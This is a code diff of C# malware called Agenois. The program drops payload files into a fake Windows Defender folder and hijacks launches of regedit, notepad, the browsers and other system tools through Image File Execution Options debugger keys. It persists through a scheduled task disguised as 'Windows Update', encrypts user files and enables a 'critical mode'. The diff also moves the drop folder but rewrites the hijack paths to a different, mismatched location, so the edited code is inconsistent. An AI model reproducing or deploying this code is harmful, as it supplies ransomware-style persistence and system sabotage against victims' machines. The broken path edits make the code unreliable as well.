@@ -22,8 +22,8 @@ namespace Agenois
         {
             InitializeComponent();
 
-            string extractPath = @"C:\Windows\Defender";
-            Directory.CreateDirectory(@"C:\Windows\Defender");
+            string extractPath = @"C:\Windows\System32\Defender";
+            Directory.CreateDirectory(@"C:\Windows\System32\Defender");
             
             RegistryKey editKey;
 
@@ -31,11 +31,10 @@ namespace Agenois
 
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
             {
-                MessageBox.Show("ayye lol");
-                File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
-                File.WriteAllBytes(extractPath + "\\cursor.ani", Resources.skull1);
-                File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
-                File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
+                File.WriteAllBytes(extractPath + @"\Payloads.dll", Resources.Payloads);
+                File.WriteAllBytes(extractPath + @"\cursor.ani", Resources.skull1);
+                File.WriteAllText(extractPath + @"\Action.bat", Resources.Action);
+                File.WriteAllBytes(extractPath + @"\IFEO.exe", Resources.IFEODebugger);
                 File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");
 
                 DirectoryInfo ch = new DirectoryInfo(extractPath);
@@ -101,73 +100,73 @@ namespace Agenois
                 editKey.Close();
 
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DVDMaker.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wordpad.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgradeui.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgrade.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StikyNot.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ehshell.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xpsrchvw.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
 
                 Process ScriptProcess = new Process();
@@ -182,7 +181,7 @@ namespace Agenois
                 LogonTrigger interval = new LogonTrigger();
                 interval.Repetition.Interval = TimeSpan.FromMinutes(1);
                 td.Triggers.Add(interval);
-                td.Actions.Add(new ExecAction(@"C:\Windows\Defender\Agenois.exe", null));
+                td.Actions.Add(new ExecAction(@"C:\Windows\System32\Defender\Agenois.exe", null));
                 ts.RootFolder.RegisterTaskDefinition("Windows Update", td);
 
                 Destructive.EncryptUserFiles();
@@ -196,8 +195,7 @@ namespace Agenois
             else
             {
                 Destructive.EnableCriticalMode();
-                MessageBox.Show("Ayye lol");
-                //Start main funcs
+                
             }
         }
 
